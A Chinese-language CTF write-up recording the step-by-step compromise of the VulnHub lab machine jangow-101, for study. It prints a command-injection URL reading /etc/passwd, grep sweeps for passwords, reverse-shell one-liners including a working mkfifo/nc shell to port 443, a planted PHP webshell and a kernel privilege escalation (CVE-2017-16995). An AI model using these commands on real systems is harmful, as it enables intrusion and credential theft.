---
title: jangow‑101 CTF笔记
date: 2025‑04‑21 12:09:04 +08:00
tags: [vulnhub, CTF练习, jangow‑101]
---

## 靶机信息

- **目标类型**：基础练习  
- **目标名称**：jangow‑101  
- **获取方式**：从 <https://www.vulnhub.com> 下载

---

## 过程

> 下面按时间顺序记录每一步的 **手段（Method）**、**发现（Finding）** 与 **结论 / 推测（Note）**。

### Step 1 — 端口扫描
- **Method**：`nmap` 扫描
- **Finding**：开放 `80/tcp`、`21/tcp`
- **Note**：存在 HTTP 与 FTP 服务

### Step 2 — FTP 匿名登录测试
- **Method**：尝试匿名访问 `ftp`
- **Finding**：服务为 *vsFTPd 3.0.3*，未开放匿名
- **Note**：公开漏洞仅少量拒绝服务类

### Step 3 — FTP 爆破预研
- **Method**：Hydra + SecLists 用户名/密码字典
- **Finding**：可能耗时数千小时
- **Note**：放弃暴力破解

### Step 4 — 浏览器访问 80 端口
- **Method**：直接访问
- **Finding**：存在 Web 站点

### Step 5 — Nikto 扫描
- **Method**：Nikto
- **Finding**：服务器允许目录索引

### Step 6 — 目录枚举
- **Method**：DirBuster
- **Finding**：可访问 `/site/js/`；框架为 Bootstrap 5

### Step 7 — OWASP ZAP 扫描
- **Method**：ZAP
- **Finding**：RCE 漏洞  
  例如：  
  `http://192.168.56.118/site/busque.php?buscar=cat+/etc/passwd`

### Step 8 — 尝试写文件 / 改密码
- **Method**：利用 RCE 写文件、修改密码
- **Finding**：上传文件失败；发现隐藏目录 `/site/wordpress`
- **Note**：疑似陷阱，无真实 WordPress

### Step 9 — 当前用户判定
- **Method**：`whoami`
- **Finding**：运行用户 `www-data`

### Step 10 — 枚举主目录
- **Method**：列 `/home`
- **Finding**：`/home/jangow01/user.txt` 含 MD5 `d41d8cd98f00b204e9800998ecf8427e`（空串）
- **Note**：无用信息

### Step 11 — 确定站点路径
- **Method**：`pwd`
- **Finding**：`/var/www/html/site`
- **Note**：`wordpress/config.php` 内容为空

### Step 12 — 向 `/tmp` 写文件
- **Method**：RCE 上传
- **Finding**：成功

### Step 13 — 自写交互式 Shell
- **Method**：Python 脚本模拟交互
- **Finding**：可顺利上传文件至 `/tmp` 与站点目录

### Step 14 — 反向代理 / 反弹 Shell 尝试
- **Method**：多种脚本（PHP/Python/Bash）
- **Finding**：全部失败

### Step 15 — 端口与进程
- **Method**：`netstat -tuln`
- **Finding**：22 端口开放但不可 SSH

### Step 16 — 大文件上传策略
- **Method**：逐字上传脚本 + WebShell
- **Finding**：成功放置 PHP webshell

### Step 17 — 提权枚举
- **Method**：`linux-exploit-suggester`
- **Finding**：列出多条可用漏洞

### Step 18 — 持久会话研究
- **Method**：Python/Bash 监听本地端口
- **Finding**：失败

### Step 19 — Netcat 测试
- **Method**：`nc`
- **Finding**：成功执行常规命令

### Step 20 — Telnet 可用性
- **Method**：检查软件与权限
- **Finding**：`www-data` 可运行 `telnet` 与 `nc`

### Step 21 — 捕获错误输出
- **Method**：`script -q -c "cmd" /dev/null`
- **Finding**：可记录错误输出

### Step 22 — 全盘搜索凭据
- **Method**：
  ```bash
  grep -ir "password" /etc/* 2>/dev/null
  grep -ir "password" /var/www/* 2>/dev/null
  ```
- **Finding**：发现 MySQL 密码

### Step 23 — 可写目录检查
- **Method**：
  ```bash
  find / -type d -writable -exec ls -ld {} \; 2>/dev/null
  ```
- **Finding**：权限严格，未获价值信息

### Step 24 — 出网端口遍历
- **Method**：自写脚本
- **Finding**：443 端口可用

### Step 25 — 反弹 Shell（失败示例）
- **Method**：`nc -e /bin/bash … 443`
- **Finding**：`-e` 被禁用

### Step 26 — 反弹 Shell（Bash 失败）
- **Method**：`bash -i >& /dev/tcp/…/443 0>&1`
- **Finding**：无权限

### Step 27 — 反弹 Shell（mkfifo 成功）
- **Method**：
  ```bash
  rm /tmp/f; mkfifo /tmp/f
  cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.1 443 > /tmp/f
  ```
- **Finding**：成功建立会话

### Step 28 — 本地提权
- **Method**：利用 `CVE-2017-16995`（eBPF 提权）
- **Finding**：成功获取 **root** shell  
  参考：<https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html>

---

## 最终结果

- 获得 **root** 权限
- 成功读取 `flag.png`

![Flag](images/jangow-101/flag.png)
